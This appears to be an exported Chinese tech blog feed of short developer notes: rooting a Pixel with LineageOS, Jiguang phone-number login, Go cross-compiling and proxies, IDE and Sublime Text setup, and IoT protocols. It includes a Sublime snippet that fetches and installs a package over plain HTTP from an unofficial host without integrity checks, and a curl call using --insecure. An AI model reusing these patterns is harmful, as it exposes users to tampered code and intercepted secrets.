<p>这些第三方ROM支持的机型比较广泛，可以查自己的型号。</p>
<p>这里刷的是 Lineage OS，在<a href="http://download.lineageos.org.cn" target="_blank" rel="noopener">国内镜像</a>下载了Pixel的ROM包，拷贝到内部存储(sdcard),在TWRP的“安装”选中ROM包，安装即可，如果开机停留在首屏动画，在TWRP格式化一下data就行。</p>
<h2 id="基于Lineage-OS的ROOT"><a href="#基于Lineage-OS的ROOT" class="headerlink" title="基于Lineage OS的ROOT"></a>基于Lineage OS的ROOT</h2><p>在 <a href="http://download.lineageos.org.cn" target="_blank" rel="noopener">Lineage OS国内镜像</a> 下载 <code>addonsu-14.1-arm64-signed.zip</code> 通过TWRP刷一下就OK了，顺便也可以刷一下 <code>Magisk-v20.3.zip</code> ,这个是管理ROOT的。</p>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="/images/android/Pixel_01.png" alt><br><img src="/images/android/Pixel_02.png" alt><br><img src="/images/android/Pixel_03.png" alt></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Pixel</tag>
      </tags>
  </entry>
  <entry>
    <title>集成极光认证服务本机号码一键登录</title>
    <url>/Android/%E9%9B%86%E6%88%90%E6%9E%81%E5%85%89%E8%AE%A4%E8%AF%81%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<p>极光的文档很详细，这里做一下笔记。</p>
<h2 id="一、账号实名认证"><a href="#一、账号实名认证" class="headerlink" title="一、账号实名认证"></a>一、账号实名认证</h2><p>需要账号实名认证，否则这个服务用不了，认证通过过，会赠送1000条认证。</p>
<h2 id="二、创建应用"><a href="#二、创建应用" class="headerlink" title="二、创建应用"></a>二、创建应用</h2><p>这就不记录了，简单的网页可视化操作流程，要注意的是：</p>
<ul>
<li>Android应用要获取App的MD5签名和packageName 一起填到控制台的应用设置里；</li>
<li>iOS只需要填Bundle ID。</li>
</ul>
<h2 id="三、填公钥到控制台"><a href="#三、填公钥到控制台" class="headerlink" title="三、填公钥到控制台"></a>三、填公钥到控制台</h2><p>生成一对RSA密钥对（位数1024位，格式PKCS#8），填 <strong>公钥</strong> 到控制台（注意要去掉其他符号或者换行符）。<br>生成秘钥的方法，可以用Java代码、openssl或者在线网页也可以，具体参考<a href="../../Java/RSA加密解密实践">【RSA加密解密实践】</a>。<br>比如这个openssl生成的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMtvNrm4VDreYXzMRnJ4htiBPn</span><br><span class="line">nw9djDL5aLQUYm3w2TQ0CGD1KMBhsm7hC5sf4RkODQYq6Wp1mkL30GStfbaal1S9</span><br><span class="line">ILnt9w51P0IpOqAFNZ6jwAtrWUhUhrr+33vcJ8gQh4+fJcAEXvrWbNnTCj9zHFDM</span><br><span class="line">elo7bR2PsDLJ6jqqkwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p>
<p>填入控制台内容应该是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMtvNrm4VDreYXzMRnJ4htiBPnnw9djDL5aLQUYm3w2TQ0CGD1KMBhsm7hC5sf4RkODQYq6Wp1mkL30GStfbaal1S9ILnt9w51P0IpOqAFNZ6jwAtrWUhUhrr+33vcJ8gQh4+fJcAEXvrWbNnTCj9zHFDMelo7bR2PsDLJ6jqqkwIDAQAB</span><br></pre></td></tr></table></figure></p>
<p><strong>私钥</strong> 保存到后台服务器，留后面解密用。</p>
<h2 id="四、移动端集成SDK"><a href="#四、移动端集成SDK" class="headerlink" title="四、移动端集成SDK"></a>四、移动端集成SDK</h2><p>按照极光的文档集成。</p>
<ul>
<li><a href="https://docs.jiguang.cn/jverification/client/android_guide/" target="_blank" rel="noopener">【Android】</a></li>
<li><a href="https://docs.jiguang.cn/jverification/client/ios_guide/" target="_blank" rel="noopener">【iOS】</a></li>
</ul>
<h2 id="五、SDK调用流程"><a href="#五、SDK调用流程" class="headerlink" title="五、SDK调用流程"></a>五、SDK调用流程</h2><p>步骤如下：</p>
<ul>
<li>5.1、调用极光 SDK 初始化 API（Android/iOS）。</li>
<li>5.2、初始化完成后，调用 <code>checkVerifyEnable</code> API（Android/iOS） 判断网络环境是否支持。</li>
<li>5.3、在手机网络环境支持的前提下，调用一键登录预取号接口 <code>preLogin</code>（Android/iOS）(可不用预取号)。</li>
<li>5.4、在预取号成功的前提下，请求授权一键登录<code>loginAuth</code>(Android)/getAuthorizationWithControll er(iOS)。</li>
<li>5.5、将请求授权后获取到的 <code>loginToken</code> 上传到后台服务端。</li>
<li>5.6、服务端调用 <a href="https://docs.jiguang.cn/jverification/server/rest_api/loginTokenVerify_api/" target="_blank" rel="noopener"><code>/v1/web/loginTokenVerify</code></a> API 获取加密后的手机号码 （<strong>注意容易忽视这一步骤</strong>）。</li>
<li>5.7、使用私钥对加密后的手机号码进行解密，得到手机号码。</li>
<li>5.8、自己处理手机号码的登录/注册，生成登录信息返回给前端，结束。</li>
</ul>
<p><strong>重点记录一下获取加密后的手机号码</strong>，<a href="https://docs.jiguang.cn/jverification/server/rest_api/loginTokenVerify_api/" target="_blank" rel="noopener">API文档</a>。</p>
<p><strong>注意</strong>：REST API鉴权是Basic方式，curl中授权信息这样填-&gt; <code>-u &#39;$appKey:$masterSecret&#39;</code>, HTTP报文为:&gt; <code>Authorization: Basic ${Base64(&#39;$appKey:$masterSecret&#39;)}</code>，这两个参数在极光的应用设置里面可以找到。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ curl --insecure -X POST -v https://api.verification.jpush.cn/v1/web/loginTokenVerify </span><br><span class="line">-H <span class="string">"Content-Type: application/json"</span> </span><br><span class="line">-u <span class="string">"$您的appKey:$你的masterSecret"</span> </span><br><span class="line">-d <span class="string">'&#123;"loginToken":"eltHrl28UBa5PZB****","exID":"1234566"&#125;'</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="string">"id"</span>: 546693586943692800,</span><br><span class="line">	<span class="string">"code"</span>: 8000,</span><br><span class="line">	<span class="string">"content"</span>: <span class="string">"get phone success"</span>,</span><br><span class="line">	<span class="string">"exID"</span>: <span class="string">"1234566"</span>,</span><br><span class="line">	<span class="string">"phone"</span>: <span class="string">"E/mSxYMPRPwspn***D6zPiNTJnIcr8Ny32GbFw8zrjK=="</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>响应数据中的 <code>phone</code> 就是加密的电话号码，用私钥对它进行RSA解密就可以得到明文的手机号码，得到手机号码之后的逻辑则由服务器后端控制了，至此结束。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Golang交叉编译</title>
    <url>/Golang/Golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<p>本文以Windows平台下编译Linux应用举例，记录一下Golang交叉编译。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># help</span></span><br><span class="line">go get：获取远程包（需 提前安装 git或hg）</span><br><span class="line">go run：直接运行程序</span><br><span class="line">go build：测试编译，检查是否有编译错误</span><br><span class="line">go fmt：格式化源码（部分IDE在保存时自动调用）</span><br><span class="line">go install：编译包文件并编译整个程序</span><br><span class="line">go <span class="built_in">test</span>：运行测试文件</span><br><span class="line">go doc：查看文档（CHM手册）</span><br></pre></td></tr></table></figure>
<h2 id="一、设置环境变量"><a href="#一、设置环境变量" class="headerlink" title="一、设置环境变量"></a>一、设置环境变量</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">set</span> GOARCH=amd64</span><br><span class="line">$ <span class="built_in">set</span> GOOS=linux</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在终端CMD输入没用，我直接在环境变量设置了 <code>GOARCH</code> 和 <code>GOOS</code> 。这样就无法在Windows运行，因为 <code>go run</code> 的也是指linux平台。</p>
</blockquote>
<h2 id="二、编译"><a href="#二、编译" class="headerlink" title="二、编译"></a>二、编译</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ go build xx.go</span><br></pre></td></tr></table></figure>
<h2 id="三、依赖错误"><a href="#三、依赖错误" class="headerlink" title="三、依赖错误"></a>三、依赖错误</h2><p>编译的时候，出现 <code>unrecognized import path &quot;golang.org/x/sys/unix&quot;</code> 错误，本来就是下载依赖库网络超时，但科学上网也没有解决。</p>
<blockquote>
<p>在Ubuntu下编译也会出现这个错误</p>
</blockquote>
<p>详细错误信息：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Fetching https://golang.org/x/sys/unix?go-get=1</span><br><span class="line">https fetch failed: Get https://golang.org/x/sys/unix?go-get=1: </span><br><span class="line">dial tcp 216.239.37.1:443: i/o timeout</span><br><span class="line">package golang.org/x/sys/unix: unrecognized import path <span class="string">"golang.org/x/sys/unix"</span> </span><br><span class="line">(https fetch: Get https://golang.org/x/sys/unix?go-get=1: </span><br><span class="line">	dial tcp 216.239.37.1:443: i/o timeout)</span><br></pre></td></tr></table></figure></p>
<p>解决办法： 通过手动下载Github上的3个依赖项目到 <code>$GOPATH/src/golang.org/x/</code> 目录</p>
<ul>
<li>github.com/golang/net.git</li>
<li>github.com/golang/sys.git</li>
<li>github.com/golang/tools.git</li>
</ul>
<p>以下是在Linux的操作日志(Windows也是通过的办法)：<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~/golangworks/src$ mkdir -p <span class="variable">$GOPATH</span>/src/golang.org/x/</span><br><span class="line">root@ubuntu:~/golangworks/src$ <span class="built_in">cd</span> !$</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/golang.org/x/</span><br><span class="line">root@ubuntu:~/golangworks/src/golang.org/x$ git <span class="built_in">clone</span> https://github.com/golang/net.git</span><br><span class="line">Cloning into <span class="string">'net'</span>...</span><br><span class="line">remote: Enumerating objects: 4, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (4/4), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 8766 (delta 0), reused 1 (delta 0), pack-reused 8762</span><br><span class="line">Receiving objects: 100% (8766/8766), 6.77 MiB | 601.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (6184/6184), <span class="keyword">done</span>.</span><br><span class="line">root@ubuntu:~/golangworks/src/golang.org/x$ git <span class="built_in">clone</span> https://github.com/golang/sys.git</span><br><span class="line">Cloning into <span class="string">'sys'</span>...</span><br><span class="line">remote: Enumerating objects: 8003, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 8003 (delta 0), reused 0 (delta 0), pack-reused 8003</span><br><span class="line">Receiving objects: 100% (8003/8003), 6.28 MiB | 554.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (6884/6884), <span class="keyword">done</span>.</span><br><span class="line">root@ubuntu:~/golangworks/src/golang.org/x$ git <span class="built_in">clone</span> https://github.com/golang/tools.git</span><br><span class="line">Cloning into <span class="string">'tools'</span>...</span><br><span class="line">remote: Enumerating objects: 6, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (6/6), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (6/6), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 29602 (delta 0), reused 1 (delta 0), pack-reused 29596</span><br><span class="line">Receiving objects: 100% (29602/29602), 13.76 MiB | 1.29 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (20632/20632), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure></p>
<h2 id="四、平台"><a href="#四、平台" class="headerlink" title="四、平台"></a>四、平台</h2><h3 id="1-GOOS：目标平台的操作系统"><a href="#1-GOOS：目标平台的操作系统" class="headerlink" title="1.GOOS：目标平台的操作系统"></a>1.GOOS：目标平台的操作系统</h3><ul>
<li>windows</li>
<li>linux</li>
<li>darwin (MacOX)</li>
<li>freebsd</li>
</ul>
<h3 id="2-GOARCH：目标平台的体系架构"><a href="#2-GOARCH：目标平台的体系架构" class="headerlink" title="2.GOARCH：目标平台的体系架构"></a>2.GOARCH：目标平台的体系架构</h3><ul>
<li>386 (32位x86)</li>
<li>amd64 (64位x86)</li>
<li>arm </li>
</ul>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>EditorConfig使用介绍</title>
    <url>/IDE/EditorConfig%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>在github看到很多项目根目录都有 <code>.editorconfig</code> 文件，所以去了解一下。</p>
<p>这个文件是 <a href="http://editorconfig.org" target="_blank" rel="noopener">EditorConfig</a> 用来统一不同编辑器的代码风格的配置。</p>
<p>各种IDE的风格自然不一样，通过这样一个配置文件定义的标准统一风格，比如缩进用x个空格。再有就是多人一起协同开发一个项目，<code>editorconfig</code>  能起到很好的效果。</p>
<p>示例：<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># EditorConfig: http://editorconfig.org/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">root</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[*]</span></span><br><span class="line"><span class="attr">indent_style</span> = space</span><br><span class="line"><span class="attr">indent_size</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">end_of_line</span> = lf</span><br><span class="line"><span class="attr">charset</span> = utf-<span class="number">8</span></span><br><span class="line"><span class="attr">trim_trailing_whitespace</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">insert_final_newline</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[*.md]</span></span><br><span class="line"><span class="attr">trim_trailing_whitespace</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>Golang设置代理解决包依赖问题</title>
    <url>/Golang/Golang%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86%E8%A7%A3%E5%86%B3%E5%8C%85%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>go get下载包失败在国内是常见的问题，下面是通过设置代理的解决方案</p>
<h3 id="Go-版本是-1-13-及以上-（推荐）"><a href="#Go-版本是-1-13-及以上-（推荐）" class="headerlink" title="Go 版本是 1.13 及以上 （推荐）"></a>Go 版本是 1.13 及以上 （推荐）</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ go env -w GO111MODULE=on</span><br><span class="line">$ go env -w GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
<h3 id="Go-版本是-1-12-及以下-实测1-14用这个方法也可以"><a href="#Go-版本是-1-12-及以下-实测1-14用这个方法也可以" class="headerlink" title="Go 版本是 1.12 及以下(实测1.14用这个方法也可以)"></a>Go 版本是 1.12 及以下(实测1.14用这个方法也可以)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/profile   （全部用户生效）</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ vim ~/.profile     （当前用户生效）</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="comment"># 七牛云赞助支持的</span></span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn</span><br><span class="line"><span class="comment"># 阿里云</span></span><br><span class="line"><span class="comment">#export GOPROXY=https://mirrors.aliyun.com/goproxy/</span></span><br><span class="line"><span class="comment"># goproxy.io</span></span><br><span class="line"><span class="comment">#export GOPROXY=https://goproxy.io/</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">source</span> ~/.profile</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>Gradle国内cdn</title>
    <url>/IDE/Gradle%E5%9B%BD%E5%86%85cdn/</url>
    <content><![CDATA[<p>gradle在中国有cdn了:</p>
<p>修改 <code>gradle-wrapper.properties</code> 中的</p>
<p><code>services.gradle.org</code> 为 <code>downloads.gradle-dn.com</code></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>JetBrains系列IDE设置注释不顶格</title>
    <url>/IDE/JetBrains%E7%B3%BB%E5%88%97IDE%E8%AE%BE%E7%BD%AE%E6%B3%A8%E9%87%8A%E4%B8%8D%E9%A1%B6%E6%A0%BC/</url>
    <content><![CDATA[<p>JetBrains系列IDE 用 <code>Ctrl + /</code> 注释一行代码时， 默认 <code>//</code> 注释符会出现在顶格，如何取消？</p>
<h2 id="java设置注释不顶行"><a href="#java设置注释不顶行" class="headerlink" title="java设置注释不顶行"></a>java设置注释不顶行</h2><p><img src="/images/IDE/java设置注释不顶行.png" alt="java设置注释不顶行.png"></p>
<h2 id="kotlin设置注释不顶行"><a href="#kotlin设置注释不顶行" class="headerlink" title="kotlin设置注释不顶行"></a>kotlin设置注释不顶行</h2><p><img src="/images/IDE/kotlin设置注释不顶行.png" alt="kotlin设置注释不顶行.png"></p>
<h2 id="注释效果"><a href="#注释效果" class="headerlink" title="注释效果"></a>注释效果</h2><p><img src="/images/IDE/注释效果.png" alt="注释效果.png"></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>IDEA插件代码绘图PlantUML</title>
    <url>/IDE/IDEA%E6%8F%92%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BB%98%E5%9B%BEPlantUML/</url>
    <content><![CDATA[<p>现在国内免费的流程图画图软件网页版的居多，如 ProcessOn 、 GitMind 、DrawIO 等。现在发现一个新的选择，IDEA上的PlantUML是一个开源的插件，可以使用代码来画图。</p>
<blockquote>
<p>Visio是商业软件 ，MasterMind 和 XMind 可以长期免费试用，只是导出文件有水印。</p>
</blockquote>
<p>安装方法很简单，在插件市场上直接搜索安装。<br><img src="/images/IDE/UML/安装.png" alt></p>
<p>创建一个PlantUML文件，选择图形类型，新文件会有示例代码<br><img src="/images/IDE/UML/创建文件.png" alt></p>
<p>支持的类型挺多的，这里截图我关注的几个类型，效果还不错：</p>
<ol>
<li>流程图是我比较感兴趣的，拖鼠标没写代码来的亲切<br><img src="/images/IDE/UML/流程图.png" alt></li>
<li>思维导图软件择比较多，这是默认样式<br><img src="/images/IDE/UML/思维导图1.png" alt></li>
<li>思维导图还可以选择不同颜色<br><img src="/images/IDE/UML/思维导图2.png" alt></li>
<li>时序图在微信的文档经常出现<br><img src="/images/IDE/UML/时序图.png" alt></li>
<li>树形图<br><img src="/images/IDE/UML/树形图.png" alt></li>
</ol>
<p>更多请参考：<a href="https://www.toutiao.com/i7013203865743344135" target="_blank" rel="noopener">【IDEA画图神器来了】</a></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>uml</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime-Text-3-设置</title>
    <url>/IDE/Sublime-Text-3-%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="安装Sublime-Text3"><a href="#安装Sublime-Text3" class="headerlink" title="安装Sublime-Text3"></a>安装Sublime-Text3</h2><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>直接下载exe安装包</p>
<h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>官网上推荐的安装方法，可能因网络原因无法访问不。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"deb https://download.sublimetext.com/ apt/stable/"</span> | sudo tee /etc/apt/sources.list.d/sublime-text.list</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install sublime-text</span></span><br></pre></td></tr></table></figure>
<p>其实，在Ubuntu的软件中心可以搜索到，直接在上面安装就好。</p>
<h2 id="安装插件-package-control"><a href="#安装插件-package-control" class="headerlink" title="安装插件 package control"></a>安装插件 package control</h2><p>打开<a href="https://packagecontrol.io/installation" target="_blank" rel="noopener">packagecontrol.io</a><br>复制代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,os,hashlib; h = &apos;6f4c264a24d933ce70df5dedcf1dcaee&apos; + &apos;ebe013ee18cced0ef93d5f746d80ef60&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by)</span><br></pre></td></tr></table></figure></p>
<p>可能由于网络原因，无法访问<a href="https://packagecontrol.io/installation" target="_blank" rel="noopener">packagecontrol.io</a></p>
<p>或者用这段代码（网上找的）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request,os; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &apos;wb&apos;).write(urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;,&apos;%20&apos;)).read())</span><br></pre></td></tr></table></figure></p>
<p>按Ctrl+`调出console（注：避免热键冲突）,粘贴代码到命令行并回车：</p>
<p>重启Sublime Text 3,如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。</p>
<h2 id="使用-package-control-安装插件"><a href="#使用-package-control-安装插件" class="headerlink" title="使用 package control 安装插件"></a>使用 package control 安装插件</h2><p>按下Ctrl+Shift+P调出命令面板，输入install 调出 Install Package 选项并回车，然后在输入要安装的插件</p>
<h2 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ChineseLocalizations</span><br><span class="line">Emmet</span><br><span class="line">BracketHighlighter</span><br><span class="line">jQuery</span><br><span class="line">Git</span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/yidaixiaohui/p/7731888.html" target="_blank" rel="noopener">更多</a></p>
<h2 id="新建标签打开文件"><a href="#新建标签打开文件" class="headerlink" title="新建标签打开文件"></a>新建标签打开文件</h2><p>Preferences–&gt;Settings 中把 Preferences.sublime–User 的 “open_files_in_new_window”: true<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;font_size&quot;: 11,</span><br><span class="line">	&quot;ignored_packages&quot;:</span><br><span class="line">	[</span><br><span class="line">		&quot;Vintage&quot;</span><br><span class="line">	],</span><br><span class="line">	&quot;open_files_in_new_window&quot;: true,</span><br><span class="line">	&quot;preview_on_click&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>Sublime Text 3</code> 在设置 <code>open_files_in_new_window</code> 之后单击文件还是只在一个标签上，原因是：</p>
<p>单击是预览，双击才是打开一个文件， <code>preview_on_click</code>，设置 false 之后就可以了，单击选中文件， <code>双击</code> 打开新文件。</p>
<h2 id="代码缩进"><a href="#代码缩进" class="headerlink" title="代码缩进"></a>代码缩进</h2><p>首选项–&gt;快捷键设置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;&quot;keys&quot;: [&quot;ctrl+i&quot;], &quot;command&quot;: &quot;reindent&quot; , &quot;args&quot;:</span><br><span class="line">&#123;&quot;single_line&quot;: false&#125;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>idea插件</title>
    <url>/IDE/idea%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>实用的插件，idea默认没有带的，自己可以安装。</p>
<h2 id="ignore"><a href="#ignore" class="headerlink" title=".ignore"></a>.ignore</h2><p>可以帮助你创建相关项目的.gitignore文件</p>
<h2 id="GsonFormat"><a href="#GsonFormat" class="headerlink" title="GsonFormat"></a>GsonFormat</h2><p>快速生成JSON类</p>
<blockquote>
<p>2021-11-11:今天发现插件市场搜不到这个插件了，只有一个 GsonFormat-Plus（功能更加多，基于GsonFormat开发，作者也不同），感觉还是GsonFormat好用，可以手动下载安装：<a href="https://plugins.jetbrains.com/plugin/7654-gsonformat/versions" target="_blank" rel="noopener">https://plugins.jetbrains.com/plugin/7654-gsonformat/versions</a> 最后更新是2017年。</p>
</blockquote>
<h2 id="Lombok"><a href="#Lombok" class="headerlink" title="Lombok"></a>Lombok</h2><p>Lombok注解</p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>IDEA设置</title>
    <url>/IDE/idea%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="启动默认不打开项目"><a href="#启动默认不打开项目" class="headerlink" title="启动默认不打开项目"></a>启动默认不打开项目</h2><p>Appearance &amp; Behavior –System Setting – Reopen last project on startup</p>
<h2 id="terminal"><a href="#terminal" class="headerlink" title="terminal"></a>terminal</h2><p>shell path 设置为 git 安装路径的/bin/bash.exe</p>
<h2 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h2><p>eclipse</p>
<h2 id="Appearance-amp-Behavior-–-path-variables"><a href="#Appearance-amp-Behavior-–-path-variables" class="headerlink" title="Appearance &amp; Behavior – path variables"></a>Appearance &amp; Behavior – path variables</h2><p>MAVEN_REPOSITORY 设置到其他盘</p>
<h2 id="Font"><a href="#Font" class="headerlink" title="Font"></a>Font</h2><p>字体 <code>DejaVu Sans Mono</code> 字号14 段距 1.1</p>
<h2 id="注释不在行首"><a href="#注释不在行首" class="headerlink" title="注释不在行首"></a>注释不在行首</h2><p>Code Style - Java：取消勾选 Comment Code </p>
<h2 id="没有显示-Git-Local-Changes"><a href="#没有显示-Git-Local-Changes" class="headerlink" title="没有显示 Git Local Changes"></a>没有显示 Git Local Changes</h2><p>2020.x新版的IDEA(包括Android Studio)默认<code>Git Gui</code>只显示<code>Log</code>项，而没有显示<code>Local Changes</code>。</p>
<p>Settings - Version Control - Commit ，取消勾选 <code>Use non-modal commit interface</code> 选项。</p>
<h2 id="codeStyleConfig-xml"><a href="#codeStyleConfig-xml" class="headerlink" title="codeStyleConfig.xml"></a>codeStyleConfig.xml</h2><p>.idea/codeStyles/codeStyleConfig.xml 使用IDEA默认的配置<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">"ProjectCodeStyleConfiguration"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">state</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">"PREFERRED_PROJECT_CODE_STYLE"</span> <span class="attr">value</span>=<span class="string">"Default"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>IDE</category>
      </categories>
  </entry>
  <entry>
    <title>IoT架构探讨</title>
    <url>/IoT/IoT%E6%9E%B6%E6%9E%84%E6%8E%A2%E8%AE%A8/</url>
    <content><![CDATA[<h2 id="协议选择"><a href="#协议选择" class="headerlink" title="协议选择"></a>协议选择</h2><p>HTTP：client-server模式，如资源访问和数据上传，暂不支持数据下行<br>COAP：client-server模式，如资源访问和数据上传，暂不支持数据下行<br>MQTT：M2M模式，如智能灯和手机App通信，支持数据下行，如推送。</p>
<p>如果不是特别小（性能资源有限）的设备，都建议采用HTTP进行资源访问通讯，如果资源允许，加上SSL肯定是比较好的。</p>
<p>COAP是基于UDP的，我理解是迷你版的HTTP，它的协议设计也参考了HTTP，占用资源很小，适合资源有限的小型嵌入式设备。</p>
<p>现在基本需要双向通讯的设备，特别是要推送消息，都采用MQTT协议了。</p>
<h2 id="MQTT数据采集"><a href="#MQTT数据采集" class="headerlink" title="MQTT数据采集"></a>MQTT数据采集</h2><p>MQTT做数据采集服务器的问题，服务端软件作为订阅者，订阅某个主题，本身这样接收数据没有问题，但是数据并发大时，只有一个订阅者单线程是否能顶得住？另外并发特别高，就是通过消息队列服务器缓冲压力（如kafka，rabbitmq，RocketMQ等）</p>
<p><a href="https://help.aliyun.com/document_detail/44551.html?spm=a2c4g.11186623.6.809.61f562c7YNoNyk" target="_blank" rel="noopener">服务端订阅消息</a></p>
<h2 id="数据采集的存储"><a href="#数据采集的存储" class="headerlink" title="数据采集的存储"></a>数据采集的存储</h2><p>日志类的数据，TSDB存储方便做可视化分析。</p>
<p><a href="https://help.aliyun.com/document_detail/55655.html?spm=a2c4g.11186623.6.543.1c1c3918qlk4SJ" target="_blank" rel="noopener">IoT设备的数据采集，日志类的应该采用TSDB时序数据库。</a><br>设备将原始数据通过 MQTT 协议发送到订阅者，转发到消息队列，继而写入到 TSDB 中存储。前端的监控系统和大数据处理系统会利用 TSDB 的数据查询和计算分析能力进行业务监控和分析结果的实时展现。</p>
